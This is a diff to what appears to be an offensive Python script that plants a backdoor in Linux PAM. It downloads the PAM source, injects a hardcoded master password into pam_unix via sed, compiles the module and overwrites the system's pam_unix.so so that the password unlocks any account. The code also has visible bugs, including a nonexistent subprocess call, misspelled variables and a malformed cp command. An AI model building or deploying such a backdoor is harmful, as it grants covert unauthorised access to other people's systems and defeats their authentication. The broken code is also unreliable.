@@ -35,7 +35,6 @@ def get_pam_source_code(pam_version):
     elif '1.5.1' in pam_version:
         os.system('wget -c https://github.com/linux-pam/linux-pam/releases/download/v1.5.1/Linux-PAM-1.5.1.tar.xz -O /tmp/pam_source_151.tar.xz | mkdir /tmp/pam_source | tar -xf pam_source*.tar.xz -C pam_source --strip-components 1')
     
-    
 
 def put_backdoor_into_code(password, path_to_source_code):
     sed_replace_rule = 'retval = _unix.*/if (strcmp(p, \\"' + password + '\\") != 0) {\\n\\t\\t&\\n\\t} else {\\n\\t\\tretval = PAM_SUCCESS;\\n\\t}'
@@ -43,15 +42,20 @@ def put_backdoor_into_code(password, path_to_source_code):
     pass    
 
 def compile_modified_pam(path_to_source_code):
-    # ./configure
-    os.system('cd ' + path_to_source_code + '&& ../../../')
-    # ./automake
-    pass
+    if 'autogen.sh' in os.listdir(path_to_source):
+        os.system('/tmp/pam_source/autoconf.sh') # PACKAGES REQUIRED: [apt-get -qq install automake autopoint gettext xsltproc docbook-xml docbook-xsl libxml2-utils bison flex] # https://github.com/linux-pam/linux-pam/issues/30 <--- ISSUE
+    os.system('/tmp/pam_source/configure')
+    os.system('cd /tmp/pam_source && make')
 
-def create_backup_of_original_pam():
-    pass
 
-def copy_backdoored_pam(path_to_backdoored_pam):
+def find_original_pam():
+    return subprocess.output("find /lib/ -name pam_unix.so", shell=True)
+    
+def create_backup_of_original_pam(path_to_original_pam):
+    os.system('cp ' + path_to_original_pam + " " + path_to_original_pam + ".bak")
+
+def copy_backdoored_pam(path_to_backdoored_pam, path_to_original_pam):
+    os.system('cp' + path_to_backdored_pam + ' ' + path_to_original_pam)
     pass
 
 def create_backdoor(password, path_to_source_code):
@@ -63,11 +67,13 @@ def create_backdoor(password, path_to_source_code):
 
 def main(arguments):
     if not arguments[1]:
-        path_to__source_code = get_pam_source_code(get_pam_version)
+        get_pam_source_code(get_pam_version())
     else:
-        path_to_source_code = get_pam_source_code(arguments[1])
-    
-    create_backdoor(arguments[0], path_to_source_code)
-    create_backup_of_original_pam()
-    copy_backdoored_pam()
+        get_pam_source_code(arguments[1])
 
+    path_to_source_code = "/tmp/pam_source"
+    create_backdoor(arguments[0], path_to_source_code)
+    create_backup_of_original_pam(find_original_pam())
+    copy_backdoored_pam(path_to_source + "/modules/pam_unix/.libs/pam_unix.so", find_original_pam())
+
+main(["", ""])
